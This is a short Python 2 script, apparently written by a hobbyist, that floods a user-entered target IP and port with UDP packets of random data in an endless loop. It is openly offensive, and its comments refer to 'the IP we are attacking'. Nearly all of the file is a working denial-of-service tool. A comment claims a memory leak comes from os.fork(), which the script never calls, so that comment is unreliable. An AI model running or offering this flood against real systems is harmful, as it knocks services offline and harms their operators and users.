# mem leak comes from the os.fork() function call which opens more than one process of the same thing (i think....not sure exactly)

import socket #Imports needed libraries
import random
import os

#setting ip and port as global is easier for scope

#The IP we are attacking
ip=raw_input('Target IP: ')
#Port we direct to attack
port=input('Port: ')

def attack(ip):
	sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a  IP UDP socket
	#Create random data to be put in packet
	bytes = random._urandom(1460) 
	#var to count loops
	counter = 0
	#Infinitely loops sending packets to the port until the program is exited.
	while True:
		if port < 65535:
			sock.sendto(bytes,(ip,port))
			counter = counter + 1
			print counter
		else:
			print "Invalid port. Try again"
			# port = port + 1     (why is that here??)
		# port = 49152 (no, i want to keep the same port)

def main():
	attack(ip)

# this is the "main" function executing
main()
